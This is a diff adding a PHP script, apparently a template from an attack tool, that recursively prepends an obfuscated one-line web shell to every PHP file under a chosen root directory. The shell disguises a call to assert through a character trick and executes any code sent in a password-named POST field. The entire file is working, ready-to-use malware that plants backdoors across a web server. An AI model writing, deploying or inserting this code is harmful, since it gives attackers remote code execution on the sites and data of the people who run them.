@@ -1,0 +1,20 @@
+<?php
+    @error_reporting(0);
+    @set_time_limit(0);
+    $prefix = '<?php if(isset($_POST['%(password)s'])){$name="a".chr(ord(substr(__FILE__,-3,-2))+3)."sert";$name($_POST['%(password)s']);exit(1);}?>';
+
+    function universe($prefix, $dir) {
+        foreach(glob("$dir/*") as $item) {
+            $item = str_replace("\\","/",$item);
+            if(is_dir($item)) {
+                universe($prefix, $item);
+            }
+            else if(preg_match("/\.(php|phar|php5)$/i",$item)) {
+                file_put_contents($item, $prefix.file_get_contents($item));
+                echo '<p>Done: '.$item.'</p>';
+            }
+        }
+    }
+
+    universe($prefix, '%(root)s');
+?>
